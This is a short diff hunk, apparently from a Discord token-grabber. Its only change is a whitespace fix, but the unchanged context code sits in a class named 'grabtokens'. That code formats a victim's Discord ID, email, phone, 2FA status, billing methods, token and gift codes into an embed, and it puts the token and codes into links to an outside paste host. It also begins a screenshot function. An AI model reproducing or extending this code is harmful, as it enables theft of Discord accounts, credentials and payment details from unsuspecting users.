@@ -280,7 +280,7 @@ class grabtokens():
             embed.add_field(name=f"DISCORD INFO - {username}", value=f'''<:1119pepesneakyevil:972703371221954630> `Discord ID:` **{discord_id}** \n<:gmail:996083031632773181> `Email:` **{email}**\n<:mobilephone:996101721879224331> `Phone:` **{phone}**\n\n<:2fa:996102455744012428> `2FA:` **{mfa}**\n<a:nitroboost:996004213354139658> `Nitro:` **{nitro}**\n<:billing:996099943574012024> `Billing:` **{methods}**\n\n<:pepehappy:996100452112400526> `Token:` **{token}**\n[Click to copy!](https://paste.addi00000.repl.co/?p={token})\n\u200b\n:gift: `{gift_title}:`\n**{all_codes}**\n[Click to copy!](https://paste.addi00000.repl.co/?p={all_codes})\u200b''', inline=False)
         except Exception as e:
             print(e)    
-            
+
 def ss():
     ImageGrab.grab(
         bbox=None,
